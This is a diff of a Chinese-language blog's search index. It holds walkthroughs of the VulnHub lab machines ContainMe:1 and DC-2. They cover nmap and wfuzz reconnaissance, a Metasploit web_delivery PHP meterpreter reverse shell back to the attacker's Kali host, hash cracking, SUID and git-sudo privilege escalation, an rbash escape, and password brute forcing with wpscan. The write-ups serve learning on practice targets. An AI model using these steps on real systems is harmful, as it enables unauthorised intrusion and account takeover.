-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/man/zh_TW</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>又发现一个二进制执行程序，好像跟之前那个是一样的<br>输入<code>./crypt mike</code>又跳转了，这回拿到了root权限<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>但事情好像没有那么简单，别忘了没跳出容器<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>这个时候可以用python httpserver传送文件了 可以传个nmap过来<br>扫描之后发现两个ip存活<br>分别是<code>172.16.20.2</code>和<code>172.16.20.6</code><br>而172.16.20.6的22ssh端口是开放的<br>在用户目录下发现了.ssh备份文件，于是直接用ssh -i连了上去。<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh mike@172.16.20.6 -i id_rsa</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"><br>用ss命令看一下开放端口<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>【鸽了几天，又换了台kali,原谅俺这个大鸽子吧呜呜呜】<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"><br>发现了mysql数据库，尝试了几个弱口令（过程略）<br>标准做法其实是映射，然后爆破mysql数据库密码，这里推荐chisel轻量工具<br>拿到密码是password<br>接下来就是一套正常操作，查查查<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/29.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/30.png"><br>拿到了密码之后去切换到root用户<br>都到最后了还得给我使绊子是吧，不过这个压缩包的密码在数据库一并给出了，解开压缩包拿到flag<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/31.png"><br>至此，渗透结束。</p>
-<hr>
-<blockquote>
-<p>人生只有走出来的美丽，没有等出来的辉煌</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>靶机渗透记录</category>
-      </categories>
-      <tags>
-        <tag>靶机渗透记录</tag>
       </tags>
   </entry>
   <entry>
@@ -897,6 +844,113 @@
       </tags>
   </entry>
   <entry>
+    <title>靶机ContainMe: 1渗透记录</title>
+    <url>/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机ContainMe: 1×1<br>渗透机kali 2021.2×1 和靶机在同一网段<br>靶机中等难度，有小挑战</p>
+<blockquote>
+<p>下载链接：<a href="https://www.vulnhub.com/entry/containme-1,729/">https://www.vulnhub.com/entry/containme-1,729/</a></p>
+</blockquote>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩，确定靶机ip。先看mac地址</p>
+<span id="more"></span>
+
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>然后扫描确定ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用nmap进行更深层次的信息探测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.12</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>web服务开着，先去瞅一眼吧<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>这个界面没啥好说的，随便输了个目录发现了端倪<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>顺便看了看phpinfo的信息，是lxd容器<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"></p>
+<blockquote>
+<p>科普<a href="https://www.linuxprobe.com/lxd-2-0-introduce.html">https://www.linuxprobe.com/lxd-2-0-introduce.html</a></p>
+</blockquote>
+<p>再回到index.php这里 我们访问这里就会显示ls -al的结果，是不是有可能存在漏洞呢？<br>用wfuzz测试一下</p>
+<blockquote>
+<p>wfuzz是一款Python开发的Web安全模糊测试工具。可以用在做请求参数参数类的模糊测试，也可以用来做Web目录扫描等操作。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/dirb/wordlists/common.txt  -u &#x27;http://192.168.155.157/index.php?FUZZ=1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/dirb/wordlists/common.txt  -u &#x27;http://192.168.155.157/index.php?FUZZ=a&#x27; --hh 329</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>找到了可以注入的地方。<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>咱现在整个就是一个赶紧上反弹shell的动作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set target PHP</span><br><span class="line">set lhost 192.168.155.128  #kali的ip</span><br><span class="line">show options</span><br><span class="line">run -j   #以后台的方式运行 sessions</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>生成的payload放到url中执行即可<br>【这张图是后来补的，所以ip变了，不要在意】<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>拿到sessions就可以进交互shell接着操作了<br>这里为了看着舒服又有Python打了交互shell(前提是靶机有Python环境)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;  </span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>进入用户目录，发现了一个可执行二进制文件<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>想要拿到这个文件可以利用刚才的网页漏洞拿出十六进制文件<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>用工具脱壳之后，用Ida打开可以发现hash字符串，输入了正确的字符串就可以拿到/bin/bash权限<br>所以把字符串复制到一个文本里用john去破解一下</p>
+<blockquote>
+<p>John the Ripper是一个快速的密码破解程序，kali安装自带，很好用的一款开源软件<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>接着输入./1cryptupx   mike即可<br>又跳到了另一个www-data权限的目录，接下来进行提权</p>
+</blockquote>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/man/zh_TW</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>又发现一个二进制执行程序，好像跟之前那个是一样的<br>输入<code>./crypt mike</code>又跳转了，这回拿到了root权限<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>但事情好像没有那么简单，别忘了没跳出容器<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>这个时候可以用python httpserver传送文件了 可以传个nmap过来<br>扫描之后发现两个ip存活<br>分别是<code>172.16.20.2</code>和<code>172.16.20.6</code><br>而172.16.20.6的22ssh端口是开放的<br>在用户目录下发现了.ssh备份文件，于是直接用ssh -i连了上去。<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh mike@172.16.20.6 -i id_rsa</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"><br>用ss命令看一下开放端口<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>【鸽了几天，又换了台kali,原谅俺这个大鸽子吧呜呜呜】<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"><br>发现了mysql数据库，尝试了几个弱口令（过程略）<br>标准做法其实是映射，然后爆破mysql数据库密码，这里推荐chisel轻量工具<br>拿到密码是password<br>接下来就是一套正常操作，查查查<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/29.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/30.png"><br>拿到了密码之后去切换到root用户<br>都到最后了还得给我使绊子是吧，不过这个压缩包的密码在数据库一并给出了，解开压缩包拿到flag<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/31.png"><br>至此，渗透结束。</p>
+<hr>
+<blockquote>
+<p>人生只有走出来的美丽，没有等出来的辉煌</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>靶机渗透记录</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机DC-2的渗透记录</title>
+    <url>/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<blockquote>
+<p>下载地址<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
+</blockquote>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>渗透机×1 kali2021.1<br>靶机DC-2×1 和渗透机在同一局域网<br>还有搜索引擎^_^</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开虚拟机 需要登录<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>话不多说，直接用从DC-1那里学来的本事，直接扫</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>还是看一眼mac地址 从而判断ip<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>接下来直接namp走一波</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -Pn -n 192.168.174.141</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>再来一次看看版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.174.141</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>嗯？开着80web服务端口 原本在22的ssh换了地方在7744<br>总之先去看看网页什么样子<br>又打开了一个win7的虚拟机 想看一下结果发现访问不成<br>搜索引擎探索了一下 这种情况可以尝试加个hosts<br>加了一下 然后可以打开了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"></p>
+<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag 1"></a>flag 1</h2><p>网页上直接有个flag<br>点击获得flag 1<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line">Your usual wordlists probably won&#x27;t work, so instead, maybe you justneed to be cewl.</span><br><span class="line">More passwords is always better, but sometimes you just can&#x27;t win themall.</span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line">lf you can&#x27;t find it, log in as another.</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag 2"></a>flag 2</h2><p>flag 1提示我们要用到cewl<br>上搜索引擎！</p>
+<blockquote>
+<p>字典生成工具Cewl使用全指南 <a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a><br>  <a href="https://www.codercto.com/a/44828.html">https://www.codercto.com/a/44828.html</a></p>
+</blockquote>
+<p>先来生成一个字典</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w dict.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>可以打开看一下<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>用wpscan扫一下看看能不能知道用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>3个用户 我们把他们加到user字典里 以防万一我密码字典也加一下 这样就可以开始爆破了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpsacn --url http://dc-2 -U user.txt  -P  dict.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>爆破出来了两个账号，没有admin，感觉后面可能要提权啊<br>wordpress的默认登录后台地址是url/wp-login.php<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>直接输入账号密码登录成功<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>打开pages界面即可发现flag<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag 3"></a>flag 3</h2><p>另一个方式，应该指的是ssh<br>ssh尝试连接 jerry登不了但是tom可以</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh tom@192.168.174.141 -p 7744  #password:parturient</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>接下来我觉得应该是渗透过程中最难的环节了<br>我这个菜鸟啥也不懂 从搜索引擎那里学了好久<br>果然还有很多东西需要学习啊<br>连接上后发现不能cat flag<br>因为ssh远程连接到服务器的环境变量中不包含对应可执行文件的路径。<br>这个需要自行添加 需要绕过rbash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">/bin/bash</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>添加后即可查看flag 3</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry.Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag-4"><a href="#flag-4" class="headerlink" title="flag 4"></a>flag 4</h2><p>提示给了su 于是切换到用户jerry<br>目录也要跳出来<br>flag 4很轻松的就出来了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you &#x27;ve made it this far - but you &quot;re not home yet.</span><br><span class="line"></span><br><span class="line">You still need to get the final flag(the only flag that really counts!! !).No hints here - you &#x27;re on your own now. :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here! ! ! !</span><br></pre></td></tr></table></figure>
+<h2 id="Final-flag"><a href="#Final-flag" class="headerlink" title="Final-flag"></a>Final-flag</h2><p>提示了git<br>这些我也不懂，但是之前刷ctf的入门题的时候提到过git相关的东西<br>文件配置不当从而给了我们提权的机会<br>执行sudo -l<br>可以发现不需要密码就能够执行<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>需要调整终端大小，使其一次性无法显示完这条命令的回显结果<br>在下面输入<code>!/bin/bash</code>即可 可以用whoami确认一下<br>跳出目录 就能获取Final-flag了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>总的来说，DC-2还算简单一些，有了之前的经验所以做起来更顺手也更快了<br>学到了很多的东西 收获颇多<br>目前来看，信息搜集和善用搜索引擎在渗透靶机的时候不可或缺</p>
+<hr>
+<blockquote>
+<p>自觉此心无一事，小鱼跳出绿萍中。——姜夔· 《湖上寓居杂咏》</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>靶机渗透记录</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透记录</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>靶机DC-1的渗透记录</title>
     <url>/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p>发现一个靶机，来学习一下</p>
@@ -966,60 +1020,6 @@
 <hr>
 <blockquote>
 <p>逆风的方向,更适合飞翔, 我不怕千万人阻挡 ,只怕自己投降</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>靶机渗透记录</category>
-      </categories>
-      <tags>
-        <tag>靶机渗透记录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶机DC-2的渗透记录</title>
-    <url>/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<blockquote>
-<p>下载地址<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
-</blockquote>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>渗透机×1 kali2021.1<br>靶机DC-2×1 和渗透机在同一局域网<br>还有搜索引擎^_^</p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开虚拟机 需要登录<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>话不多说，直接用从DC-1那里学来的本事，直接扫</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<p>还是看一眼mac地址 从而判断ip<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>接下来直接namp走一波</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -Pn -n 192.168.174.141</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>再来一次看看版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.174.141</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>嗯？开着80web服务端口 原本在22的ssh换了地方在7744<br>总之先去看看网页什么样子<br>又打开了一个win7的虚拟机 想看一下结果发现访问不成<br>搜索引擎探索了一下 这种情况可以尝试加个hosts<br>加了一下 然后可以打开了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"></p>
-<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag 1"></a>flag 1</h2><p>网页上直接有个flag<br>点击获得flag 1<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line">Your usual wordlists probably won&#x27;t work, so instead, maybe you justneed to be cewl.</span><br><span class="line">More passwords is always better, but sometimes you just can&#x27;t win themall.</span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line">lf you can&#x27;t find it, log in as another.</span><br></pre></td></tr></table></figure>
-
-<h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag 2"></a>flag 2</h2><p>flag 1提示我们要用到cewl<br>上搜索引擎！</p>
-<blockquote>
-<p>字典生成工具Cewl使用全指南 <a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a><br>  <a href="https://www.codercto.com/a/44828.html">https://www.codercto.com/a/44828.html</a></p>
-</blockquote>
-<p>先来生成一个字典</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w dict.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>可以打开看一下<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>用wpscan扫一下看看能不能知道用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>3个用户 我们把他们加到user字典里 以防万一我密码字典也加一下 这样就可以开始爆破了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpsacn --url http://dc-2 -U user.txt  -P  dict.txt</span><br></pre></td></tr></table></figure>
